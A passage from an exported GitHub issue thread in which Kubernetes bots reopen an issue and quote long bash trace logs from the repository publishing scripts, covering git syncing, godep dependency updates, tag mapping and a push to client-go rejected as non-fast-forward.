'c179a9c9df4bfb6421258a5f31da9f595474ada4^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list c179a9c9df4bfb6421258a5f31da9f595474ada4..upstream-branch --ancestry-path\n>\t+++ git rev-parse c179a9c9df4bfb6421258a5f31da9f595474ada4\n>\t+ local k_last_kube_merge=c179a9c9df4bfb6421258a5f31da9f595474ada4\n>\t+ local dep_count=2\n>\t+ (( i=0 ))\n>\t+ (( i<2 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit c179a9c9df4bfb6421258a5f31da9f595474ada4.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit c179a9c9df4bfb6421258a5f31da9f595474ada4.\n>\t++ look -b c179a9c9df4bfb6421258a5f31da9f595474ada4 ../kube-commits-apimachinery-master\n>\t+ '[' -z c6dd271be00615c6fa8c91fdf63381265a5f0e4e ']'\n>\t+ pushd ../apimachinery\n>\tChecking out k8s.io/apimachinery to c6dd271be00615c6fa8c91fdf63381265a5f0e4e\n>\t+ echo 'Checking out k8s.io/apimachinery to c6dd271be00615c6fa8c91fdf63381265a5f0e4e'\n>\t+ git checkout -q c6dd271be00615c6fa8c91fdf63381265a5f0e4e\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<2 ))\n>\t+ local dep=api\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit c179a9c9df4bfb6421258a5f31da9f595474ada4.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit c179a9c9df4bfb6421258a5f31da9f595474ada4.\n>\t++ look -b c179a9c9df4bfb6421258a5f31da9f595474ada4 ../kube-commits-api-master\n>\tChecking out k8s.io/api to a191abe0b71e00ce4cde58af8002aa4c1a8bb068\n>\t+ '[' -z a191abe0b71e00ce4cde58af8002aa4c1a8bb068 ']'\n>\t+ pushd ../api\n>\t+ echo 'Checking out k8s.io/api to a191abe0b71e00ce4cde58af8002aa4c1a8bb068'\n>\t+ git checkout -q a191abe0b71e00ce4cde58af8002aa4c1a8bb068\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<2 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' true = true ']'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ echo 'Removing k8s.io/*, gofuzz, go-openapi and glog from vendor/ because this is a library.'\n>\t+ rm -rf ./vendor/github.com/golang/glog\n>\tRemoving k8s.io/*, gofuzz, go-openapi and glog from vendor/ because this is a library.\n>\t+ rm -rf ./vendor/k8s.io\n>\t+ rm -rf ./vendor/github.com/google/gofuzz\n>\t+ rm -rf ./vendor/github.com/go-openapi\n>\t+ git add Godeps/Godeps.json\n>\t+ git clean -f Godeps\n>\t+ git add vendor/ --ignore-errors\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\tGodeps.json hasn't changed!\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code 345cb50e92869ee605a0d9b20f92ebe419a529e2\n>\tRemove redundant godep commits on-top of 345cb50e92869ee605a0d9b20f92ebe419a529e2.\n>\t+ echo 'Remove redundant godep commits on-top of 345cb50e92869ee605a0d9b20f92ebe419a529e2.'\n>\t+ git reset --soft -q 345cb50e92869ee605a0d9b20f92ebe419a529e2\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/cluster-bootstrap\n>\t+ local repo=cluster-bootstrap\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n '345cb50 Merge pull request #67356 from yliaog/master' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-cluster-bootstrap-master'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-cluster-bootstrap-master\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=master\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=345cb50e92869ee605a0d9b20f92ebe419a529e2\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-cluster-bootstrap-master.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-cluster-bootstrap-master.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch master --push-script ../push-tags-cluster-bootstrap-master.sh --dependencies apimachinery:master,api:master --mapping-output-file '../tag-cluster-bootstrap-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\tComputing mapping from kube commits to the local branch \"master\" at 345cb50e92869ee605a0d9b20f92ebe419a529e2 because \"kubernetes-1.9.0-alpha.2\" seems to be relevant.\n>\t++ git rev-parse master\n>\t+ '[' 345cb50e92869ee605a0d9b20f92ebe419a529e2 '!=' 345cb50e92869ee605a0d9b20f92ebe419a529e2 ']'\n>\t+ git checkout master\n>\tAlready on 'master'\n>\tYour branch is up-to-date with 'origin/master'.\n>[09 Oct 18 08:19 UTC]: Successfully constructed master\n>[09 Oct 18 08:19 UTC]: /publish_scripts/push.sh /etc/secret-volume/token master\n>\tEverything up-to-date\n>[09 Oct 18 08:19 UTC]: /publish_scripts/push.sh /etc/secret-volume/token release-1.9\n>\tEverything up-to-date\n>[09 Oct 18 08:19 UTC]: /publish_scripts/push.sh /etc/secret-volume/token release-1.10\n>\tEverything up-to-date\n>[09 Oct 18 08:19 UTC]: /publish_scripts/push.sh /etc/secret-volume/token release-1.11\n>\tEverything up-to-date\n>[09 Oct 18 08:19 UTC]: /publish_scripts/push.sh /etc/secret-volume/token release-1.12\n>\tEverything up-to-date\n>[09 Oct 18 08:19 UTC]: /publish_scripts/push.sh /etc/secret-volume/token master\n>\tEverything up-to-date\n>[09 Oct 18 08:19 UTC]: /publish_scripts/push.sh /etc/secret-volume/token release-1.9\n>\tEverything up-to-date\n>[09 Oct 18 08:19 UTC]: /publish_scripts/push.sh /etc/secret-volume/token release-1.10\n>\tEverything up-to-date\n>[09 Oct 18 08:19 UTC]: /publish_scripts/push.sh /etc/secret-volume/token release-1.11\n>\tEverything up-to-date\n>[09 Oct 18 08:19 UTC]: /publish_scripts/push.sh /etc/secret-volume/token release-1.12\n>\tEverything up-to-date\n>[09 Oct 18 08:19 UTC]: /publish_scripts/push.sh /etc/secret-volume/token master\n>\tEverything up-to-date\n>[09 Oct 18 08:19 UTC]: /publish_scripts/push.sh /etc/secret-volume/token release-1.9\n>\tEverything up-to-date\n>[09 Oct 18 08:19 UTC]: /publish_scripts/push.sh /etc/secret-volume/token release-1.10\n>\tEverything up-to-date\n>[09 Oct 18 08:19 UTC]: /publish_scripts/push.sh /etc/secret-volume/token release-1.11\n>\tEverything up-to-date\n>[09 Oct 18 08:19 UTC]: /publish_scripts/push.sh /etc/secret-volume/token release-1.12\n>\tEverything up-to-date\n>[09 Oct 18 08:19 UTC]: /publish_scripts/push.sh /etc/secret-volume/token master\n>\tTo https://github.com/kubernetes/client-go\n>\t ! [rejected]        master -> master (fetch first)\n>\terror: failed to push some refs to 'https://github.com/kubernetes/client-go'\n>\thint: Updates were rejected because the remote contains work that you do\n>\thint: not have locally. This is usually caused by another repository pushing\n>\thint: to the same ref. You may want to first integrate the remote changes\n>\thint: (e.g., 'git pull ...') before pushing again.\n>\thint: See the 'Note about fast-forwards' in 'git push --help' for details.\n>[09 Oct 18 08:19 UTC]: exit status 1\n>    \tTo https://github.com/kubernetes/client-go\n>    \t ! [rejected]        master -> master (fetch first)\n>    \terror: failed to push some refs to 'https://github.com/kubernetes/client-go'\n>    \thint: Updates were rejected because the remote contains work that you do\n>    \thint: not have locally. This is usually caused by another repository pushing\n>    \thint: to the same ref. You may want to first integrate the remote changes\n>    \thint: (e.g., 'git pull ...') before pushing again.\n>    \thint: See the 'Note about fast-forwards' in 'git push --help' for details.\n>\n>[09 Oct 18 08:19 UTC]: exit status 1```\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@k8s-publishing-bot: Reopening this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-428291011):\n\n>/reopen\n>\n>The last publishing run failed: exit status 255\n>```\n>...ube-commits-apiserver-master\n>\t+ '[' -z 75a03c2d437ac87229cdc1d43c039a4e7bf7ecf5 ']'\n>\t+ pushd ../apiserver\n>\t+ echo 'Checking out k8s.io/apiserver to 75a03c2d437ac87229cdc1d43c039a4e7bf7ecf5'\n>\tChecking out k8s.io/apiserver to 75a03c2d437ac87229cdc1d43c039a4e7bf7ecf5\n>\t+ git checkout -q 75a03c2d437ac87229cdc1d43c039a4e7bf7ecf5\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<2 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' true = true ']'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ echo 'Removing k8s.io/*, gofuzz, go-openapi and glog from vendor/ because this is a library.'\n>\t+ rm -rf ./vendor/github.com/golang/glog\n>\tRemoving k8s.io/*, gofuzz, go-openapi and glog from vendor/ because this is a library.\n>\t+ rm -rf ./vendor/k8s.io\n>\t+ rm -rf ./vendor/github.com/google/gofuzz\n>\t+ rm -rf ./vendor/github.com/go-openapi\n>\t+ git add Godeps/Godeps.json\n>\t+ git clean -f Godeps\n>\t+ git add vendor/ --ignore-errors\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\tGodeps.json hasn't changed!\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code 57f0565a45055114d30ee46939bfd1574c47db9c\n>\t+ echo 'Remove redundant godep commits on-top of 57f0565a45055114d30ee46939bfd1574c47db9c.'\n>\t+ git reset --soft -q 57f0565a45055114d30ee46939bfd1574c47db9c\n>\tRemove redundant godep commits on-top of 57f0565a45055114d30ee46939bfd1574c47db9c.\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/kube-scheduler\n>\t+ local repo=kube-scheduler\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n '2cb7fac Merge pull request #68195 from luxas/consolidate_componentconfig_code_standards' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-kube-scheduler-master'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-kube-scheduler-master\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=master\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=57f0565a45055114d30ee46939bfd1574c47db9c\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-kube-scheduler-master.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-kube-scheduler-master.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch master --push-script ../push-tags-kube-scheduler-master.sh --dependencies apimachinery:master,apiserver:master --mapping-output-file '../tag-kube-scheduler-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\tComputing mapping from kube commits to the local branch \"master\" at 57f0565a45055114d30ee46939bfd1574c47db9c because \"kubernetes-1.9.0-alpha.2\" seems to be relevant.\n>\t++ git rev-parse master\n>\t+ '[' 57f0565a45055114d30ee46939bfd1574c47db9c '!=' 57f0565a45055114d30ee46939bfd1574c47db9c ']'\n>\t+ git checkout master\n>\tAlready on 'master'\n>\tYour branch is up-to-date with 'origin/master'.\n>[09 Oct 18 17:59 UTC]: Successfully constructed master\n>[09 Oct 18 17:59 UTC]: /publish_scripts/construct.sh kube-scheduler release-1.12 release-1.12 apimachinery:release-1.12,apiserver:release-1.12  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/kube-scheduler kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  243557ba3da96995db4f8efbc756fc935d074739\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=kube-scheduler\n>\t+ SRC_BRANCH=release-1.12\n>\t+ DST_BRANCH=release-1.12\n>\t+ DEPS=apimachinery:release-1.12,apiserver:release-1.12\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/kube-scheduler\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=243557ba3da96995db4f8efbc756fc935d074739\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tRunning garbage collection.\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 57f0565a45055114d30ee46939bfd1574c47db9c\n>\t+ git branch -D release-1.12\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.12\n>\tSwitching to origin/release-1.12.\n>\t+ echo 'Switching to origin/release-1.12.'\n>\t+ git branch -f release-1.12 origin/release-1.12\n>\t+ git checkout -q release-1.12\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.12\n>\t+ UPSTREAM_HASH=243557ba3da96995db4f8efbc756fc935d074739\n>\t+ '[' 243557ba3da96995db4f8efbc756fc935d074739 '!=' 243557ba3da96995db4f8efbc756fc935d074739 ']'\n>\t+ echo 'Skipping sync because upstream/release-1.12 at 243557ba3da96995db4f8efbc756fc935d074739 did not change since last sync.'\n>\tSkipping sync because upstream/release-1.12 at 243557ba3da96995db4f8efbc756fc935d074739 did not change since last sync.\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.12\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=f79e0b4b33a9f995cdc1beff2e5225bb771be606\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-kube-scheduler-release-1.12.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-kube-scheduler-release-1.12.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.12 --push-script ../push-tags-kube-scheduler-release-1.12.sh --dependencies apimachinery:release-1.12,apiserver:release-1.12 --mapping-output-file '../tag-kube-scheduler-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\tComputing mapping from kube commits to the local branch \"release-1.12\" at f79e0b4b33a9f995cdc1beff2e5225bb771be606 because \"kubernetes-1.11.0-alpha.1\" seems to be relevant.\n>\t++ git rev-parse release-1.12\n>\t+ '[' f79e0b4b33a9f995cdc1beff2e5225bb771be606 '!=' f79e0b4b33a9f995cdc1beff2e5225bb771be606 ']'\n>\t+ git checkout release-1.12\n>\tYour branch is up-to-date with 'origin/release-1.12'.\n>\tAlready on 'release-1.12'\n>[09 Oct 18 18:00 UTC]: Successfully constructed release-1.12\n>[09 Oct 18 18:00 UTC]: Successfully ensured /go-workspace/src/k8s.io/kube-controller-manager exists\n>[09 Oct 18 18:00 UTC]: /bin/bash -c \"git tag | xargs git tag -d >/dev/null\"\n>[09 Oct 18 18:00 UTC]: /publish_scripts/construct.sh kube-controller-manager master master apimachinery:master,apiserver:master  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/kube-controller-manager kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  4966faab3618ff2889326a3e64ef2bbb7433e610\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=kube-controller-manager\n>\t+ SRC_BRANCH=master\n>\t+ DST_BRANCH=master\n>\t+ DEPS=apimachinery:master,apiserver:master\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/kube-controller-manager\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=4966faab3618ff2889326a3e64ef2bbb7433e610\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tRunning garbage collection.\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 7585de142f540d0e0fc5c986d4e3aea354ff97c3\n>\t+ git branch -D master\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/master\n>\t+ echo 'Switching to origin/master.'\n>\tSwitching to origin/master.\n>\t+ git branch -f master origin/master\n>\t+ git checkout -q master\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/master\n>\tUpstream branch upstream/master moved from '4966faab3618ff2889326a3e64ef2bbb7433e610' to '686b37ff9be554dc030b60d4624d5a512d5dd735'. We have to sync.\n>\ta9337666b29bf2d9c68a01115958c76405c65da3\n>\t+ UPSTREAM_HASH=686b37ff9be554dc030b60d4624d5a512d5dd735\n>\t+ '[' 686b37ff9be554dc030b60d4624d5a512d5dd735 '!=' 4966faab3618ff2889326a3e64ef2bbb7433e610 ']'\n>\t+ echo 'Upstream branch upstream/master moved from '\\''4966faab3618ff2889326a3e64ef2bbb7433e610'\\'' to '\\''686b37ff9be554dc030b60d4624d5a512d5dd735'\\''. We have to sync.'\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/kube-controller-manager master master apimachinery:master,apiserver:master '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/kube-controller-manager\n>\t+ local src_branch=master\n>\t+ local dst_branch=master\n>\t+ local deps=apimachinery:master,apiserver:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ shift 9\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 9 = 0 ']'\n>\t++ git rev-parse HEAD\n>\tStarting at existing master commit a9337666b29bf2d9c68a01115958c76405c65da3.\n>\t+ echo 'Starting at existing master commit a9337666b29bf2d9c68a01115958c76405c65da3.'\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/master\n>\tBranch upstream-branch set up to track remote branch master from upstream.\n>\t++ git rev-parse upstream-branch\n>\t+ echo 'Checked out source commit 686b37ff9be554dc030b60d4624d5a512d5dd735.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\tChecked out source commit 686b37ff9be554dc030b60d4624d5a512d5dd735.\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit master\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ grep '^Kubernetes-commit: '\n>\t++ git log --format=%B master\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t++ head -n 1\n>\t+ local k_base_commit=a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50\n>\t+ '[' -z a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50 ']'\n>\t++ git-find-merge a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50 upstream/master\n>\t++ tail -1\n>\t+++ git rev-list 'a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50^1..upstream/master' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50..upstream/master --ancestry-path\n>\t+++ git rev-parse a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50\n>\t+ local k_base_merge=a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50\n>\t+ '[' -z a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50 ']'\n>\t+ git branch -f filtered-branch-base a6eb49f0dc9a6d9fecf7ff4a8edeaa382b55ac50\n>\tRewriting upstream branch master to only include commits for staging/src/k8s.io/kube-controller-manager.\n>\t+ echo 'Rewriting upstream branch master to only include commits for staging/src/k8s.io/kube-controller-manager.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/kube-controller-manager 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/kube-controller-manager\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\tRunning git filter-branch ...\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/kube-controller-manager -- filtered-branch filtered-branch-base\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=efc2db79585412fcbbce0126d91bab430e6cba0c\n>\t++ git log --first-parent --format=%H --reverse efc2db79585412fcbbce0126d91bab430e6cba0c..HEAD\n>\tChecking out branch master.\n>\t+ f_mainline_commits=\n>\t+ echo 'Checking out branch master.'\n>\t+ git checkout -q master\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 